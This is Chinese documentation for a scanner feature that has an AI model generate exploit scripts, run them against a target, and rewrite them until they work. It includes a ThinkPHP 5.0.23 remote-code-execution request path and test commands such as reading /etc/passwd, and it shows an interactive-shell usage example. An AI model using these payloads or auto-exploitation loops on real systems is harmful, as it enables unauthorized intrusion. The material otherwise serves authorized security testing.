# AI EXP 自动验证功能说明

## 功能概述

本功能实现了AI生成EXP的自动验证和迭代修正机制，确保生成的EXP可以直接使用。

## 核心特性

### 1. 漏洞类型自动分类

系统会自动识别漏洞类型，并使用对应的模板生成EXP：

- **RCE型（命令执行/代码执行）**
  - 关键词：command injection, rce, remote code exec, 命令注入, 命令执行
  - 特征：包含 `{{cmd}}` 或 `{{command}}` 占位符
  - 模板特点：支持交互式Shell、命令输出提取

- **越权型（未授权访问）**
  - 关键词：unauthorized, auth bypass, idor, 未授权, 越权
  - 模板特点：身份验证绕过、权限验证

- **文件操作型**
  - 关键词：file upload, upload, webshell, 文件上传
  - 模板特点：文件上传、下载、路径遍历

- **信息泄露型**
  - 关键词：info disclosure, information leak, path traversal, lfi, ssrf
  - 模板特点：敏感信息提取、路径遍历

- **SQL注入型**
  - 关键词：sql injection, sqli, sql注入
  - 模板特点：SQL注入检测和利用

### 2. 自动验证机制

生成EXP后，系统会：

1. 保存EXP到临时文件
2. 使用测试命令自动运行
3. 检查输出是否包含"VULNERABLE"标记
4. 验证是否能成功提取命令输出

### 3. 迭代修正流程

如果验证失败，系统会：

1. **分析失败原因**
   - 执行超时
   - 连接失败
   - 语法错误
   - 输出提取失败
   - 未检测到漏洞特征

2. **AI修正**
   - 将失败原因和错误日志发送给AI
   - AI分析问题并生成修正版本
   - 最多重试5次

3. **备用修复**
   - 如果AI修正失败，使用规则修复
   - 自动修复语法错误
   - 改进输出提取逻辑
   - 添加缺失的标记

### 4. 详细日志输出

整个过程在控制台打印详细日志：

```
[分类] 漏洞类型: 命令执行
[测试命令] 使用测试命令: echo NEONSCAN_TEST_$(whoami)_$(pwd)
[目录] EXP保存目录: /tmp/neonscan_exp

========== 验证尝试 #1/5 ==========
[保存] EXP已保存到: /tmp/neonscan_exp/exp_attempt_1.py
[代码] EXP代码长度: 3245 字符
[运行] 开始执行EXP...
[运行] 文件: /tmp/neonscan_exp/exp_attempt_1.py
[运行] 目标: http://target.com
[运行] 命令: echo NEONSCAN_TEST_$(whoami)_$(pwd)
[运行] 超时: 10 秒
[运行] 执行耗时: 2.34 秒
[运行] ✓ EXP执行成功
[输出] 共 15 行输出
[输出] VULNERABLE
[输出] NEONSCAN_TEST_root_/var/www
[验证] ✓ 检测到漏洞特征 (VULNERABLE)
[提取] ✓ 成功提取命令输出
[提取] 输出内容: NEONSCAN_TEST_root_/var/www

========== ✓ 验证成功! ==========
[成功] EXP验证通过!
[文件] 最终EXP: /tmp/neonscan_exp/exp_attempt_1.py
[输出示例] NEONSCAN_TEST_root_/var/www
```

## API 使用方法

### 请求示例

```json
{
  "provider": "deepseek",
  "apiKey": "your-api-key",
  "baseUrl": "https://api.deepseek.com",
  "model": "deepseek-chat",
  "targetBaseUrl": "http://target.com",
  "autoVerify": true,
  "targetURL": "http://target.com",
  "maxRetries": 5,
  "exp": {
    "name": "ThinkPHP 5.0.23 RCE",
    "exploitSuggestion": "远程代码执行漏洞",
    "steps": [
      {
        "method": "GET",
        "path": "/index.php?s=captcha",
        "body": "",
        "headers": {},
        "validate": {
          "status": [200]
        }
      },
      {
        "method": "POST",
        "path": "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{cmd}}",
        "body": "",
        "headers": {},
        "validate": {
          "status": [200]
        }
      }
    ]
  }
}
```

### 响应示例

```json
{
  "name": "ThinkPHP 5.0.23 RCE",
  "keyInfo": "漏洞利用关键信息...",
  "python": "# -*- coding: utf-8 -*-\nimport requests\n...",
  "verified": true,
  "verifyAttempts": 1,
  "category": "命令执行",
  "verifyLogs": [
    "[分类] 漏洞类型: 命令执行",
    "[测试命令] 使用测试命令: echo NEONSCAN_TEST_$(whoami)_$(pwd)",
    "...",
    "[成功] EXP验证通过!"
  ]
}
```

## 参数说明

| 参数 | 类型 | 必填 | 说明 |
|------|------|------|------|
| provider | string | 是 | AI提供商：deepseek, openai, anthropic, ollama |
| apiKey | string | 是 | API密钥 |
| baseUrl | string | 否 | API基础URL |
| model | string | 否 | 模型名称 |
| targetBaseUrl | string | 否 | 目标基础URL |
| autoVerify | boolean | 否 | 是否启用自动验证（默认false） |
| targetURL | string | 条件 | 用于验证的目标URL（autoVerify=true时必填） |
| maxRetries | int | 否 | 最大重试次数（默认5） |
| exp | object | 是 | EXP规范 |

## 生成的EXP特点

### 1. 详细的执行日志

```python
print("[INFO] Target:", target)
print("[INFO] Payload:", payload)
print("[INFO] Sending request...")
print("[INFO] Response status:", resp.status_code)
print("[INFO] Response length:", len(resp.text))
print("[INFO] Extracting output...")
print("[RESULT]", extracted_output)
```

### 2. 命令输出提取

对于RCE类型的漏洞，使用标记包裹命令：

```python
cmd_wrapped = f"echo NEONSCAN_BEGIN; {cmd}; echo NEONSCAN_END"
# 执行后提取 NEONSCAN_BEGIN 和 NEONSCAN_END 之间的内容
```

### 3. 错误处理

```python
try:
    resp = session.post(url, data=payload, timeout=timeout)
    # 处理响应
except requests.Timeout:
    print("[ERROR] Request timeout")
except requests.ConnectionError:
    print("[ERROR] Connection failed")
except Exception as e:
    print(f"[ERROR] {e}")
```

### 4. 交互式Shell（RCE类型）

```bash
# 单次命令执行
python exp.py --target http://target.com --cmd "whoami"

# 交互式Shell
python exp.py --target http://target.com --shell
cmd> whoami
root
cmd> pwd
/var/www/html
cmd> exit
```

## 测试命令

系统根据漏洞类型使用不同的测试命令：

- **命令执行/代码执行**: `echo NEONSCAN_TEST_$(whoami)_$(pwd)`
- **信息泄露**: `cat /etc/passwd`
- **文件上传**: `echo test`
- **未授权访问**: `id`
- **其他**: `echo test`

## 故障排除

### 1. Python未安装

```
[运行] ✗ EXP执行失败: exec: "python3": executable file not found in $PATH
```

**解决方法**: 安装Python 3

### 2. 执行超时

```
[运行] ✗ EXP执行超时
```

**解决方法**: 
- 增加超时时间
- 检查目标是否可访问
- 检查网络连接

### 3. 语法错误

```
[运行] ✗ EXP执行失败: SyntaxError: invalid syntax
```

**解决方法**: 系统会自动尝试修复，或手动检查生成的代码

### 4. 无法提取输出

```
[提取] ✗ 无法提取命令输出
```

**解决方法**: 
- 系统会自动改进提取逻辑
- 检查目标响应格式
- 手动调整正则表达式

## 最佳实践

1. **首次使用**: 先不启用autoVerify，检查生成的EXP是否符合预期
2. **验证测试**: 使用真实的测试环境进行验证
3. **日志分析**: 仔细查看verifyLogs，了解失败原因
4. **手动调整**: 如果自动修正失败，根据日志手动调整EXP
5. **保存结果**: 验证成功的EXP会保存在 `/tmp/neonscan_exp/` 目录

## 注意事项

1. 自动验证需要目标环境可访问
2. 某些漏洞可能需要特定的环境配置
3. 验证过程会实际执行漏洞利用，请在授权环境中使用
4. 最大重试次数建议设置为3-5次
5. 生成的EXP仅供安全测试使用，请遵守相关法律法规
